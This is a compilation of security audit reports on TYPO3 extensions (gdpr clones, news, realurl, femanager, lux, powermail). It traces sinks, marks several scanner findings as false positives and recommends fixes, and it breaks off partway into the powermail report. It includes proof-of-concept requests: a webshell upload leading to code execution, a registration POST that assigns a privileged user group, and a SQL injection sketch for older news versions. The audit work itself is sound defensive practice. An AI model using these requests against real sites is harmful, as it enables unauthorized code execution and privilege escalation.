- **Bypasses TYPO3's `BE/fileDenyPattern`.** This uses raw `move_uploaded_file`, not FAL, so the platform control that normally blocks executable uploads does not apply. A **low-privileged backend editor** who has the "gdpr" module (`access => user,group`, not admin-only) can drop a PHP webshell even though they could not do so via the File module → **privilege escalation to RCE**.
- Response returns the public URL of the stored file (`:311`), giving the attacker the exact path to invoke.

Trigger (requires a valid backend session + module CSRF token — i.e. an authenticated be_user driving the module):
```
POST /typo3/module/gdpr/gdprgooglemaps?…&action=uploadImage&…token=<beToken>
Content-Type: multipart/form-data
  image=@shell.php
→ 200 {"url":"fileadmin/user_upload/two_click_solution/<md5>.php"}
then: GET /fileadmin/user_upload/two_click_solution/<md5>.php  → code execution
```

**Verdict: CONFIRMED arbitrary-file-upload → RCE, authentication level = BACKEND (`be_user`, module access `user,group`). NOT pre-auth.** Real-world impact: RCE for any authenticated backend user with the gdpr module, bypassing `fileDenyPattern` (editor→RCE privesc). It is **not** an anonymous/internet-facing RCE because `uploadImage` is not exposed on the frontend plugin, via eID, or via any AJAX route.

Secondary (same action, backend-only): the `forCookie` branch (`:270-287`) unconditionally `DELETE`s the whole `…_cookiewidget` table and inserts request-controlled `cookieWidgetImageValue`/`cookieWidgetPositionValue`. Backend-authenticated data tampering; low impact.

---

## Issue B2 — SQLi in manager actions → **FALSE POSITIVE**

All queries use Doctrine `QueryBuilder`:
- `listAction` delete uses `createNamedParameter($twoClickSolutions, Connection::PARAM_STR_ARRAY)` (`:93`); insert uses bound `->values([...])` (`:112`).
- `uploadImageAction` cookiewidget insert uses bound `->values([...])` (`:281`).
- FE `GdprGooglemapsController::indexAction` uses `->like('extension_title', createNamedParameter('%googlemaps%'))` (`GdprGooglemapsController.php:71`) — constant, bound.

No request value is concatenated into SQL. **FALSE POSITIVE.**

---

## Issue B3 — IDOR in manager actions → **FALSE POSITIVE (backend-scoped)**

`edit/update/delete/show` map a `GdprManager` by uid via Extbase argument mapping. These are reachable **only through the backend module** (`be_user` auth). A backend user acting on any `GdprManager` row is within the module's intended scope; there is no tenant/ownership boundary being crossed and no frontend exposure. **FALSE POSITIVE** (no anonymous IDOR).

Note: `listAction` also has a destructive side effect — it `DELETE`s `…_gdprmanager` rows whose `extension_title` is not in the currently-loaded extension set on every load (`:88-96`), and contains dead code after an unconditional `return $this->redirect('edit', …)` at `:143` (lines `:145-149` never execute). Logic/data-loss bug, backend-only, not attacker-controlled.

---

## Generalization across the `gdpr-extensions-com_*` family

Confirmed by grep over the sibling extensions in the tree:
- **23** `gdpr-extensions-com_*` directories present.
- **19** ship a `Classes/Controller/GdprManagerController.php` containing the identical `move_uploaded_file` upload with `pathinfo(..., PATHINFO_EXTENSION)` and **no allow-list**.
- **In 0 of them** is `uploadImage` registered on a frontend plugin / eID / AJAX route (every clone's `ext_localconf.php` lists only `Gdpr<X>Controller => 'index'` in the authoritative array and `GdprManagerController => 'create, update, delete'` in the ignored non-cacheable array — e.g. `…-youtube/ext_localconf.php:9,14`). The three clones carrying a `Configuration/Extbase/AjaxRoutes.php` (`-grl`, `-grt`, `-gt`) use a **non-standard path TYPO3 does not load** and target a different `myAjaxAction`, not `uploadImage`.

**The B1 finding generalizes to all ~19 clones with the same verdict: CONFIRMED backend-authenticated arbitrary-file-upload → RCE (fileDenyPattern bypass / editor privesc), NOT pre-auth.** Fixing the shared `uploadImageAction` (add an image-extension allow-list + route through FAL / `GeneralUtility::verifyFilenameAgainstDenyPattern`) fixes the whole family.

---

## Overall

| Issue | Verdict |
|---|---|
| `uploadImageAction` unrestricted upload → RCE | **CONFIRMED — backend (`be_user`) authenticated**, NOT pre-auth; bypasses `fileDenyPattern` (editor→RCE). Generalizes to ~19 clones. |
| SQLi (manager actions) | FALSE POSITIVE — QueryBuilder bound params throughout |
| IDOR (manager actions) | FALSE POSITIVE — backend-module-scoped; no frontend exposure |
| `forCookie` table wipe/insert | backend-only data tampering, low impact |

No anonymous/pre-auth exploitation path exists in this controller: `uploadImage` and all mutating manager actions are exposed only via the backend module (`access => user,group`); the frontend plugin exposes only the read-only map `indexAction`.

### georgringer_news

#### Security Audit: georgringer/news (TYPO3 "News system")

**Audited version:** 14.0.3 (`ext_emconf.php` line 10; `composer.json`) — TYPO3 v13.4/v14 compatible.
**Scope:** pre-auth exploitable vulnerabilities in the actual source.

## Summary

**No solid pre-auth exploitable vulnerability was found in this version (14.0.3).** The extension exposes a
purely Extbase-based frontend attack surface (no eID handlers, no custom PSR-15 middlewares, no AJAX endpoints).
All traced source→sink paths are either parameterized (Extbase QOM), integer-cast, whitelist-validated, or
config-driven rather than request-driven. Notably, 14.0.3 is the **patch release** for the recent pre-auth SQL
injection **CVE-2026-8726 / TYPO3-EXT-SA-2026-010**, and the fix (identifier quoting) is present in the audited
source. The historical `overwriteDemand` order-by SQLi (TYPO3-EXT-SA-2017-001) is likewise mitigated here.

Pre-auth attack surface enumerated:
- **eID handlers:** none (`grep eID_include / Frontend\Middleware` → nothing; no `Configuration/RequestMiddlewares.php`).
- **PSR-15 middlewares:** none registered by the extension.
- **AJAX endpoints:** none.
- **Unauthenticated Extbase plugins** (`ext_localconf.php`): `NewsController` (list, detail, selectedList,
  dateMenu, searchForm, searchResult), `CategoryController::list`, `TagController::list`. These are the real
  pre-auth entry points and were traced in full.
- Backend controllers (`AdministrationController`, `Import*`, `Updates/*`, `Backend/*`) are **not pre-auth** and
  were excluded from findings.

---

## Findings (traced paths — all currently NON-exploitable in 14.0.3)

### 1. Date-menu `dateField` → raw SQL in `countByDate()` — PATCHED here (this is CVE-2026-8726)

- **SEVERITY:** High (in unpatched versions ≤14.0.2); **not exploitable in 14.0.3**.
- **PRE-AUTH:** Yes.
- **Source:** `Classes/Controller/NewsController.php:432-462` (`dateMenuAction(?array $overwriteDemand)`) →
  `overwriteDemandObject()` at `Classes/Controller/NewsController.php:163-186`, which does
  `ObjectAccess::setProperty($demand, $propertyName, $propertyValue)` for attacker-supplied keys, allowing
  `tx_news_pi1[overwriteDemand][dateField]` to reach `NewsDemand::setDateField()`.
- **Sink:** `Classes/Domain/Repository/NewsRepository.php:349-388` (`countByDate()`), which concatenates
  `$demand->getDateField()` directly into a raw SQL string built with string interpolation (into
  `FROM_UNIXTIME(...)` / `date_trunc(...)` / `strftime(...)` and executed via `$connection->executeQuery($sql)`).
- **Tainted path:** `?tx_news_pi1[overwriteDemand][dateField]=…` → `setDateField()` → `getDateField()` → raw `$sql`.
- **Why NOT exploitable in 14.0.3:** at `NewsRepository.php:366` the field is now wrapped:
  `$field = $connection->quoteIdentifier(empty($field) ? 'datetime' : $field);`. `quoteIdentifier()` backtick-
  quotes the value and doubles embedded backticks, so a payload such as `datetime FROM x-- -` becomes a single
  invalid quoted identifier (query errors) rather than breaking out. This `quoteIdentifier` call **is** the
  official fix shipped in 14.0.3. Exploitation additionally required the non-default TypoScript setting
  `disableOverrideDemand = 0` and an active "Date Menu" plugin.
- **PoC sketch (would work only against ≤14.0.2 with overrideDemand enabled):**
  `GET /date-menu-page?tx_news_pi1[overwriteDemand][dateField]=<SQL>` on a page rendering the `NewsDateMenu`
  plugin. Against 14.0.3 this returns a DB error / no injection.

### 2. `overwriteDemand` mass-assignment (`ObjectAccess::setProperty`) — bounded, no reachable dangerous sink

- **SEVERITY:** Low / informational.
- **PRE-AUTH:** Yes, but **disabled by default**.
- **Path:** `list/searchForm/searchResult/dateMenu` actions apply `overwriteDemand` only when
  `(int)($this->settings['disableOverrideDemand'] ?? 1) !== 1` — i.e. the default (`1`) blocks it entirely.
  `ignoredSettingsForOverride = ['demandclass','orderbyallowed','selectedList']` (`NewsController.php:60`) and the
  case-insensitive check at `NewsController.php:169` prevent overriding `demandClass` (object-instantiation guard
  at `NewsController.php:100-121`, `makeInstance($class,...)`) and `orderByAllowed` (the ordering whitelist).
- **Why not a finding:** the only writable properties are typed scalar setters on `NewsDemand`; every downstream
  constraint is built with Extbase QOM bound parameters (see finding 4). The one raw-SQL reachable property
  (`dateField`) is neutralized per finding 1. Worst residual impact (only if an admin enables overrideDemand) is
  reading news from other storage pids via `storagePage` — low, and news records are public content.

### 3. Ordering (`order` / `orderBy`) — whitelist-validated, not injectable

- **PRE-AUTH:** Yes (via `overwriteDemand[order]` when enabled), but safe.
- `Classes/Domain/Repository/NewsRepository.php:267-289` builds orderings only if
  `Validation::isValidOrdering($demand->getOrder(), $demand->getOrderByAllowed())` passes.
  `Classes/Utility/Validation.php:22-58` requires every order field to be in the `orderByAllowed` allow-list
  (`GeneralUtility::inList`) and the direction to be exactly `asc`/`desc`. `orderByAllowed` cannot be overridden
  by the request (finding 2) and is additionally locked to TS in `buildSettings()`
  (`propertiesNotAllowedViaFlexForms = ['orderByAllowed']`, `NewsController.php:596-601`). This is the fix for the
  historical order-by SQLi (TYPO3-EXT-SA-2017-001) and is intact.

### 4. Search subject → SQL — parameterized

- **PRE-AUTH:** Yes (`searchResult`, user-supplied `tx_news_pi1[search][subject]`), but safe.
- `Classes/Domain/Repository/NewsRepository.php:444-499` (`getSearchConstraints`) uses
  `$query->like($field, '%'.$searchSubject.'%')` / `$query->logicalOr/And(...)` — Extbase QOM, which binds the
  subject as a parameter. `$field` names come from `settings['search']['fields']` (TypoScript config, set in the
  controller at `NewsController.php:521`), **not** from the request. No string concatenation into SQL. Dates use
  `strtotime()` (int). Not injectable.

### 5. Dynamic `makeInstance()` / template path / file reads — config-controlled, not attacker-controlled

- `NewsController.php:386` `makeInstance($providerClass)` ← `settings['detail']['pageTitle']['provider']` (TS).
- `NewsController.php:659` `makeInstance($paginationClass, …)` ← `settings…['paginate']['class']` (TS).
- `NewsBaseController.php:90` `getFileAbsFileName($options[1])` and `:562` PluginPreviewRenderer template path ←
  `settings['detail']['errorHandling']` (TS) / backend template (fixed EXT: path). None reach request input.
- No `eval`, `unserialize`, `call_user_func`, `create_function`, or `makeInstance($requestControlledVar)` exist in
  `Classes/` (grep clean). `f:format.raw` appears only in **backend** Fluid templates (PageLayoutView, Import),
  not on frontend request data. Frontend output of `search`/`overwriteDemand` goes through auto-escaping Fluid and
  link-building ViewHelpers.

### 6. Direct request input outside Extbase — all integer-cast

- `Seo/NewsAvailability.php:126-127`, `DataProcessing/DisableLanguageMenuProcessor.php:77-78`
  (`getQueryParams()['tx_news_pi1']['news']`), `Seo/NewsXmlSitemapDataProvider.php:124` (`['page']`),
  `Domain/Repository/CategoryRepository.php:221-222` (`['L']`) — every one is wrapped in `(int)`. No taint reaches
  a sink.

---

## Known CVEs (version cross-ref)

| Advisory | CVE | Type | Affected | Fixed in | Status for 14.0.3 |
|---|---|---|---|---|---|
| TYPO3-EXT-SA-2026-010 | CVE-2026-8726 | SQL Injection (pre-auth, Date Menu plugin, `overwriteDemand[dateField]`) | ≤11.4.3, 12.0.0–12.3.1, 13.0.0–13.0.1, **14.0.0–14.0.2** | 11.4.4, 12.3.2, 13.0.2, **14.0.3** | **NOT affected** — this is the fixed release; the `quoteIdentifier()` mitigation is present at `NewsRepository.php:366`. |
| TYPO3-EXT-SA-2017-001 | (news order-by SQLi) | SQL Injection via `overwriteDemand` ordering | old 2.x/3.x line | 3.2.6 / 4.0.0 era | **NOT affected** — mitigated by `Validation::isValidOrdering()` allow-list (`Utility/Validation.php`) + `orderByAllowed` override protection. |

CVE-2026-8726 is the single most relevant public advisory; the audited version 14.0.3 is precisely its remediation
release, and the corresponding source-level fix is confirmed present. No known CVE affects 14.0.3.

Sources:
- [TYPO3-EXT-SA-2026-010](https://typo3.org/security/advisory/typo3-ext-sa-2026-010)
- [TYPO3-EXT-SA-2017-001](https://typo3.org/security/advisory/typo3-ext-sa-2017-001)

### helhum_realurl

#### Audit: helhum/realurl — CodeQL "SQL injection" (UrlRewritingHook.php:769 & :1701)

**Verdict: FALSE POSITIVE (both sinks).** The concatenated SQL reaching `sql_query()` is fully escaped: array values pass through `INSERTquery()`'s internal `fullQuoteArray()`, and every manually-appended fragment is either an integer `time()` value or a `fullQuoteStr()`-quoted string. No attacker-controlled data reaches the sink unescaped.

- **Extension:** RealURL (author Dmitry Dulepov / helhum fork)
- **Version:** 2.1.8 (`ext_emconf.php:33`), TYPO3 6.2.6–8.7.99, PHP 5.3.7–7.1
- **Reachability:** The hook runs pre-auth on every FE request (URL decode/encode), so reachability is not the mitigating factor — the escaping is.

---

## Sink 1 — `:769` (encode cache write)

```php
756  $insertFields = array(
757      'url_hash'      => $hash,           // md5($urlData.'///'.serialize($internalExtras))
758      'origparams'    => $urlData,
759      'internalExtras'=> ... serialize ...,
760      'content'       => $setEncodedURL,
761      'page_id'       => $this->encodePageId,
762      'tstamp'        => time()
763  );
764  if ($this->useMySQLExtendedSyntax) {
766      $query  = $GLOBALS['TYPO3_DB']->INSERTquery('tx_realurl_urlencodecache', $insertFields);
767      $query .= ' ON DUPLICATE KEY UPDATE tstamp=' . $insertFields['tstamp'];   // time() → int
769      $GLOBALS['TYPO3_DB']->sql_query($query);
```

- `INSERTquery($table, $fields_values)` applies `fullQuoteArray()` to every value in `$insertFields` by default (`$no_quote_fields = false`) — `url_hash`, `origparams`, `content`, `page_id`, `tstamp` are all quoted/escaped.
- The only hand-built fragment (`:767`) is `tstamp=` . `time()`, an integer. Not injectable.
- Context: this is the **encode** path (link generation for outgoing URLs), not the decode path — the values derive from internally generated URL data, not raw request input, and they are escaped regardless.

## Sink 2 — `:1701` (404 error-log write in `decodeSpURL_throw404`)

```php
1694  $fields_values = array('url_hash'=>$hash, 'url'=>$this->speakingURIpath_procValue,
                            'error'=>$msg, 'counter'=>1, 'tstamp'=>time(), 'cr_date'=>time(),
                            'rootpage_id'=>$rootpage_id,
                            'last_referer'=>GeneralUtility::getIndpEnv('HTTP_REFERER'));
1697  $query  = $GLOBALS['TYPO3_DB']->INSERTquery('tx_realurl_errorlog', $fields_values);
1699  $query .= ' ON DUPLICATE KEY UPDATE '
              . 'error='       . $GLOBALS['TYPO3_DB']->fullQuoteStr($msg, 'tx_realurl_errorlog') . ','
              . 'counter=counter+1,'
              . 'tstamp='      . $fields_values['tstamp'] . ','          // time() → int
              . 'last_referer='. $GLOBALS['TYPO3_DB']->fullQuoteStr(GeneralUtility::getIndpEnv('HTTP_REFERER'), 'tx_realurl_errorlog');
1701  $GLOBALS['TYPO3_DB']->sql_query($query);
```

- `$this->speakingURIpath_procValue` (the **decoded URL path — genuinely attacker-controlled**) lands in `$fields_values['url']`, and `HTTP_REFERER` lands in `last_referer`. Both go through `INSERTquery()` → `fullQuoteArray()`, so they are escaped.
- The hand-built `ON DUPLICATE KEY UPDATE` fragment (`:1699`) re-injects only `$msg` and `HTTP_REFERER`, each wrapped in `fullQuoteStr()`, plus an integer `time()`. All escaped.
- CodeQL flags the string-concatenation-into-`sql_query()` shape, but every tainted component is quoted before concatenation.

## Would-be trigger (does NOT work)

`GET /'"><evil>/path/` on any realurl-driven FE site reaches `decodeSpURL_throw404()` for an unknown path and writes the raw path into `tx_realurl_errorlog.url` — but via `fullQuoteArray`, so the quotes are escaped. No SQL injection.

## Verdict

**FALSE POSITIVE** for `:769` and `:1701`. Sanitizers `INSERTquery`/`fullQuoteArray` + `fullQuoteStr` + integer `time()` neutralize all inputs. Not a pre-auth SQLi.

### in2code_femanager

#### Security Audit — in2code/femanager

- **Target:** `/home/user/sources/code/typo3-extensions/in2code_femanager`
- **Version:** 13.3.3 (ext_emconf.php) — TYPO3 v13 line, PHP >= 8.1
- **Scope:** pre-auth frontend attack surface — registration / confirmation / invitation / edit / password / AJAX
- **Date:** 2026-08-04

## Summary

femanager 13.3.3 is, on the whole, a **hardened** codebase. The historically dangerous flows are
correctly protected:

- **Confirmation / invitation hashes** are `md5(username + suffix + TYPO3 encryptionKey)` (unforgeable
  without the server secret) — no `uniqid`/`mt_rand`/timestamp predictability.
- **Edit / delete** are protected against IDOR/account-takeover by an HMAC "spoof" token bound to the
  logged-in user's uid+crdate, plus an explicit `uid === currentUser.uid` check (`AbstractController::isSpoof`).
- **Extbase `__trustedProperties`** (Fluid `<f:form>`) blocks mass-assignment of non-rendered fields
  (`disable`, `tx_extbase_type`, `starttime`, …) on create/update — these fields are never rendered, so
  they cannot be injected via extra POST keys.
- No SQL injection (all repository access is via the Extbase query builder with bound parameters; the one
  request-influenced `orderby` is `preg_replace`'d to `[A-Za-z0-9_-]`).
- No `unserialize`/`eval`/`system`; dynamic `$obj->{$method}()` calls are all **config- or DB-driven**, never request-tainted.
- No open redirect (all redirects go through TypoScript `redirect`/`requestRedirect` cObjects, not request params).

**One genuine finding** (F1): value-level **usergroup mass-assignment / privilege escalation** that
bypasses the `removeFromUserGroupSelection` control — pre-auth via registration. Two low-severity
observations (F2 info disclosure, F3 static-hash design) follow.

| # | Finding | Severity | Pre-auth |
|---|---------|----------|----------|
| F1 | Usergroup value not server-side allow-listed → self-assign arbitrary `fe_group` | **Medium** (High impact where privileged FE groups exist) | **Yes** (registration) |
| F2 | `confirmCreateRequest` renders any user by uid before hash check (config-gated) | Low | Yes |
| F3 | Confirmation hash is static/non-expiring and reused across purposes | Low / Info | — |

---

## F1 — Usergroup mass-assignment / privilege escalation (removeFromUserGroupSelection is client-only)

- **SEVERITY:** Medium (High where any `fe_group` grants meaningful privilege, e.g. access to
  access-restricted pages/content or a de-facto "editor" group)
- **PRE-AUTH:** Yes — reachable through the anonymous Registration plugin (`createAction`). Also reachable
  authenticated via Edit (`updateAction`) and Invitation (`updateAction`).

**Source (tainted input):**
`tx_femanager_registration[user][usergroup][0]=<groupUid>` — rendered field, therefore a *trusted*
property, so Extbase's `__trustedProperties` HMAC does **not** stop it:
- `Resources/Private/Partials/Fields/Usergroup.html:17` → `name="user[usergroup][0]"`, options `= {allUserGroups}`.

**Sink (privilege granted):**
- `Classes/Controller/NewController.php:61` — `createAction(User $user, …)`: Extbase maps the submitted
  `usergroup` uid to a `UserGroup` and attaches it to the new `fe_users` record.
- `Classes/Domain/Model/User.php:233` `setUsergroup()` / `:242` `addUsergroup()` — no restriction.

**Why the intended control fails:**
- `Classes/Domain/Repository/UserGroupRepository.php:22` `findAllForFrontendSelection($removeList)` only
  filters which groups are **rendered as `<option>`s**. It is a *presentation* filter.
- `Classes/Utility/UserUtility.php:136` `overrideUserGroup()` forces groups **only if**
  `settings.new.overrideUserGroup` is configured; when it is not (the common case for sites that let users
  choose a group), the submitted value stands.
- `Classes/Domain/Validator/ServersideValidator.php:26-108` iterates only over *configured validation
  fields* (`required`, `email`, `min`, `inList`, …). There is **no check that a submitted usergroup uid is a
  member of `findAllForFrontendSelection`** (or of any allow-list). `usergroup` is normally not in the
  validation settings at all, so it is never inspected.

**Tainted path:**
`POST tx_femanager_registration[user][usergroup][0]=<privileged_gid>`
→ `NewController::createAction` (Extbase property mapping; `usergroup` is a trusted rendered field)
→ `overrideUserGroup` (no-op unless `overrideUserGroup` set)
→ `ServersideValidator` (usergroup not validated)
→ `userRepository->add($user)` → account persisted with attacker-chosen group
→ attacker confirms via the email hash they legitimately receive (they control the address)
→ on login the account is a member of an `fe_group` the site intended to hide via `removeFromUserGroupSelection`.

**Exploitability (honest):** Real, but conditional:
1. the registration form must expose the usergroup field (default "show all fields" branch,
   `New.html:61`, renders it; many installs do), **and**
2. `new.overrideUserGroup` must not be set (if set, groups are forced server-side and this is fully mitigated), **and**
3. a target `fe_group` must actually confer privilege beyond the intended registrant group.
The attacker may submit **any** group uid, including groups explicitly removed from the dropdown via
`removeFromUserGroupSelection` — that control provides zero server-side enforcement. This is the classic,
long-standing femanager escalation vector.

**PoC sketch:**
```
POST /registration-page HTTP/1.1
Content-Type: application/x-www-form-urlencoded

tx_femanager_registration[__referrer][...]=...&tx_femanager_registration[__trustedProperties]=<valid, from GET form>
&tx_femanager_registration[user][username]=attacker
&tx_femanager_registration[user][email]=attacker@evil.tld
&tx_femanager_registration[user][password]=Passw0rd!
&tx_femanager_registration[user][usergroup][0]=<uid_of_privileged_or_hidden_fe_group>
```
`usergroup` is present in the page's own `<f:form>`, so the reused `__trustedProperties` blob accepts it;
only the *value* is swapped for a privileged/hidden group uid. Complete the email confirmation → escalated.

**Remediation:** Enforce, server-side, that every submitted usergroup uid ∈ `findAllForFrontendSelection(removeFromUserGroupSelection)`
(reject/strip otherwise), or make `overrideUserGroup` the default. Do not treat the dropdown option set as a
security boundary.

---

## F2 — Pre-auth user data disclosure via `confirmCreateRequest` (config-gated)

- **SEVERITY:** Low
- **PRE-AUTH:** Yes

**Path:** `Classes/Controller/NewController.php:119-201` `confirmCreateRequestAction(int $user, string $hash, string $status, ?string $adminHash)`.
The user record is loaded by **uid** at line 127 (`findByUid($user)`) *before* any hash validation. In the
`userConfirmation` (line 164) and `userConfirmationRefused` (line 149) branches — active when
`confirmUserConfirmation` / `confirmUserConfirmationRefused` TypoScript is `1` — the controller assigns the
loaded `$user` to the view and renders `Templates/New/ConfirmCreateRequest.html` **without** calling
`HashUtility::validHash` for that branch. An anonymous request
`?tx_femanager_registration[action]=confirmCreateRequest&…&user=<uid>&status=userConfirmation` therefore
renders whatever profile fields that template exposes for an arbitrary user uid (enumeration of registered
users / names). The `adminConfirmation*` branches (lines 179-227) *do* gate on `validHash($adminHash,…,'admin')`,
so no admin path is exposed. State-changing operations (`statusUserConfirmation`, etc.) all remain gated by
`validHash`, so this is disclosure only, not takeover.

**Exploitability:** Only when the `confirmUserConfirmation(Refused)` intermediate-dialog options are enabled
(non-default). Impact limited to the fields the confirmation template prints. Rate-limited registration does
not apply to this GET.

**Remediation:** Validate `HashUtility::validHash($hash, $user)` at the top of `confirmCreateRequestAction`,
before loading/assigning the user for the dialog branches.

---

## F3 — Confirmation hash is static, non-expiring, and cross-purpose (design note)

- **SEVERITY:** Low / Informational
- **PRE-AUTH:** n/a (defense-in-depth)

`Classes/Utility/HashUtility.php:27` `createHashForUser($user, $suffix) = substr(md5(username + suffix + encryptionKey), 0, 16)`.
This is **unforgeable** without the site `encryptionKey`, so it is *not* a predictability bug (no
`uniqid`/`mt_rand`/time). However:
- It is derived solely from the (rarely changing) username, so the same value is valid **forever** — no
  nonce, no expiry, no single-use. A confirmation/invitation link that leaks (browser history, `Referer` to
  third-party assets on the confirmation page, proxy logs) stays valid indefinitely.
- The **same** hash authorizes multiple sensitive operations: create-confirm, `NewController` delete-on-refuse,
  and — via `InvitationController::editAction/updateAction/deleteAction` (`InvitationController.php:172,229,279`)
  — **setting the invited user's password** (account takeover of an invited-but-not-yet-activated user).
  One leaked hash thus enables confirm + delete + (for invited users) password set.
- 16 hex chars = 64 bits: not remotely brute-forceable, and registration is rate-limited
  (`RatelimiterService`), so online guessing is impractical. Reported for completeness, not as an exploit.

**Remediation (hardening):** Include a per-record random nonce + timestamp in the hashed material, store it,
expire it, and invalidate after first successful use; use distinct secrets/suffixes per operation class.

---

## Reviewed and found NOT exploitable

- **Edit / Delete IDOR & account takeover** — `EditController::updateAction` (`:56`) / `deleteAction` (`:199`)
  require `AbstractController::isSpoof` (`:489`) to pass: HMAC token `hmac(uid, crdate)` (`hash_equals`, tied
  to the logged-in user) **and** `currentUser.uid === submitted __identity`. Cross-user edit/delete is blocked;
  token is server-secret-keyed. Solid.
- **Mass-assignment of `disable` / `tx_extbase_type` / `starttime` / `admin`** — these are never rendered in
  the create/edit `<f:form>`, so Extbase `__trustedProperties` (HMAC-signed with encryptionKey) rejects them
  as extra POST keys. `fe_users` has no `admin` column. Not injectable.
- **`UserController::loginAsAction` (impersonation)** (`:129`) — gated by `BackendUserUtility::isAdmin()` OR
  `ConfigurationUtility::isEnableLoginAsActive()` (reads `$GLOBALS['BE_USER']->getTSConfig()`); both require a
  backend user context. Not reachable by an anonymous frontend visitor. (Minor style nit: `ImpersonateEvent`
  is dispatched before the authorization check, but the actual `UserUtility::login` occurs only after it.)
- **SQL injection** — `UserRepository::findByUsergroups` (`:60`) uses `$query->like()`/`contains()` with bound
  values; `searchword` (request) is a bound LIKE parameter; `fieldsToSearch`/`orderby` come from TypoScript,
  and `orderby` is `preg_replace('/[^a-zA-Z0-9_-]/','')`-sanitized. `DataController::getStatesForCountryAction`
  uses static_info_tables repositories (bound). No raw/concatenated SQL anywhere in `Classes/`.
- **XSS in confirmation pages/mails** — reflected `hash`/`status` land in Fluid `<f:form.hidden>` / attributes,
  which auto-escape; no `f:format.raw` on request data in these flows.
- **Open redirect** — `redirectByAction` (`AbstractController.php:453`) builds targets from TypoScript
  `redirect`/`requestRedirect` cObjects, not from any `redirect`/`return`/`referer` request parameter.
- **RCE (dynamic dispatch)** — `EditController::statusConfirm` setter names come from server-generated
  `tx_femanager_changerequest` XML; `FrontendUtility::forceValues` and `FinisherRunner` method names come from
  TypoScript. None are request-tainted.
- **`CleanUserGroupMiddleware` / `RemovePasswordIfEmptyMiddleware`** — only unset an empty usergroup[0] /
  empty password key in the parsed body; no injection surface.

---

## Known CVEs / advisories cross-reference

femanager has a history of TYPO3 security advisories in exactly the audited areas. Findings vs. this version (13.3.3):

- **Frontend-user record spoofing / editing other users (account takeover)** — the historical femanager class
  of bug (arbitrary `fe_users` edit via manipulated identity). **Mitigated here** by the `isSpoof()`
  HMAC-token + `uid === currentUser.uid` mechanism (`AbstractController.php:489`). Not reproducible.
- **Insufficient property/mass-assignment validation on registration** (the recurring femanager
  usergroup/field-injection theme). **Partially mitigated** by Extbase `__trustedProperties` for non-rendered
  fields, but **F1 above shows the usergroup value itself is still not allow-listed** — the residual, and the
  one live issue in this review.
- **XSS / SQLi / open-redirect advisories** in older femanager releases — no residual instances found in this
  version (see "Reviewed and found NOT exploitable").

No published CVE was found that is un-patched in 13.3.3 based on source review; the extension is current with
the v13 line. Recommend confirming against the in2code/femanager GitHub security advisories and TYPO3 SA feed
for any post-13.3.3 disclosures.

### in2code_lux

#### in2code_lux — SQL injection audit (Target B)

**Verdict: FALSE POSITIVE (no unescaped request value reaches the raw SQL).**

The sink builds SQL by string concatenation (which is why CodeQL flags it), but
every interpolated component is either an integer produced by
`DateTime::format('U')`, a value passed through `Connection::quote()`, or an
allowlist-cleaned domain string. No request-derived string reaches the raw query
unescaped. (Secondary point: the only caller is a backend dashboard widget.)

## Version / compat
- Version: **43.1.0** (`ext_emconf.php`)

## Sink — `Classes/Domain/Repository/PagevisitRepository.php:341`
`getAmountOfReferrers(FilterDto $filter, int $limit = 100)`:
```php
$sql = 'select referrer, count(referrer) count from ' . Pagevisit::TABLE_NAME
    . ' where referrer != \'\''
    . ' and referrer not regexp "' . $siteService->getAllDomainsForWhereClause() . '"'
    . $this->extendWhereClauseWithFilterTime($filter)
    . $this->extendWhereClauseWithFilterSite($filter)
    . ' group by referrer having (count > 1) order by count desc limit ' . $limit;
$records = $connection->executeQuery($sql)->fetchAllAssociative();   // line 341
```

## Component-by-component taint analysis
- `Pagevisit::TABLE_NAME` — class constant. Not tainted.
- `$limit` — typed `int` parameter. The caller
  (`ReferrerAmountDataProvider::prepareData`) passes no value (default 100). Not tainted.
- `getAllDomainsForWhereClause()` — `Classes/Domain/Service/SiteService.php:102`.
  Domains come from site configuration; the appended current domain is
  `StringUtility::cleanString(FrontendUtility::getCurrentDomain(), true, './_-')`,
  an allowlist of alphanumerics + `./_-`. Quotes, spaces and `"` are stripped, so
  it cannot break out of the `regexp "…"` literal.
- `extendWhereClauseWithFilterTime($filter)` — `AbstractRepository.php:146-162`.
  Emits `crdate>' . $filter->getStartTimeForFilter()->format('U') . ' and crdate<' . ...->format('U')`.
  `getStartTimeForFilter()`/`getEndTimeForFilter()` (`FilterDto.php:661,682`)
  return `DateTime`; `->format('U')` yields a **pure integer** string. Not injectable.
- `extendWhereClauseWithFilterSite($filter)` — `AbstractRepository.php:194-201`.
  Emits `site in (' . $this->quotedList($filter->getSitesForFilter()) . ')`.
  `quotedList()` (`AbstractRepository.php:393-396`) maps every element through
  `quoteValue()` → `Connection::quote()` (`AbstractRepository.php:388-391`).
  **Escaped.**

Even where the `FilterDto` originates from a backend request, none of the filter
fields that reach *this* sink survive as raw strings: time → integer, site →
`Connection::quote()`.

## Reachability / auth
Only caller: `Classes/Domain/DataProvider/ReferrerAmountDataProvider.php:37`
(`getAmountOfReferrers($this->filter)`), a lux analytics **backend dashboard**
data provider (BE-authenticated). The tracking/beacon FE write path stores the
`referrer` column; this method only *reads/aggregates* it, and the stored value
is never concatenated into the WHERE clause here.

## Trigger
None. No HTTP request lets an anonymous (or authenticated) user inject SQL at
this sink — the tainted-looking inputs are integer-formatted or `quote()`-escaped
before concatenation.

## Bottom line
Raw-concatenation pattern, but defended by `DateTime::format('U')` (integers) and
`Connection::quote()` / cleanString allowlist. **Not exploitable — false positive.**

### in2code_powermail

#### Security Audit — in2code/powermail

**Target:** `/home/user/sources/code/typo3-extensions/in2code_powermail`
**Version:** 13.1.0 (ext_emconf.php) — TYPO3 v13.4+, PHP ^8.2 (composer.json)
**Scope:** Pre-auth (frontend, unauthenticated) exploitable vulnerabilities in the actual source.
**Date:** 2026-08-04

## Summary

No solid pre-auth Critical/High/Medium finding. This is a **hardened, recent release**: every classic powermail pre-auth sink (reflected marker/prefill XSS, marker SQLi, upload traversal, eID SSRF) has been closed in this line. The only concrete issue is one **LOW** — the spam-notification template emits `print_r($_REQUEST)` through `f:format.raw` into an admin notification. Several historically-vulnerable surfaces were traced end-to-end and confirmed non-exploitable in this version (documented below so the negative result is auditable).

Counts: Critical 0 · High 0 · Medium 0 · Low 1 · Informational/Reviewed-safe 4

---

## Findings

### LOW-1 — Unsanitized `$_REQUEST` reflected into SpamShield admin notification (HTML/log injection)
- **PRE-AUTH:** Yes (triggering the spam path is anonymous), but impact target is the **admin/editor** recipient, and only fires when the configured spam tolerance is exceeded and `spamshield.email`/logging is enabled.
